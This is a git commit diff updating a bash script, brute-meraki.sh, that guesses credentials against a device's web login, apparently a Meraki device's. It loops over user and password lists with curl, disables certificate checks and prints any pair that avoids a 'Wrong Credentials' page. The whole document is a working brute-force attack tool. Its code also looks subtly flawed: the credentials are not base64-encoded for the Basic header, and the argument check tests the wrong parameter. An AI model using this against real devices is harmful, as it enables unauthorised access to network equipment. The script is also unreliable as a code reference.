2acaab418b4a4b2022aa25c57747e293137e8c71
John Cartrett <jnqpblc@gmail.com>
2021-11-16 08:19:12 -0600

    Update brute-meraki.sh

--- brute-meraki.sh
+++ brute-meraki.sh
@@ -1,9 +1,14 @@
-for u in `<unix_users.txt`; do
-  for p in `<unix_passwords.txt`; do
+#!/bin/bash
+if [ -z $2 ]; then printf "\nSyntax: $0 <host> <userlist> <passlist>\n\n"
+else
+HOST=$1; USER=$2; PASS=$3;
+for u in `<$USER`; do
+  for p in `<$PASS`; do
     b=`echo -n "$u:$p"`
-    guess=`curl -H "authorization: Basic $b" -sk https://$1/webui/index.html |grep 'Wrong Credentials'`
+    guess=`curl -H "authorization: Basic $b" -sk https://$HOST/webui/index.html |grep 'Wrong Credentials'`
     if [ -z "$guess" ]; then
       echo "[+] $u:$p"
     fi
   done
 done
+fi
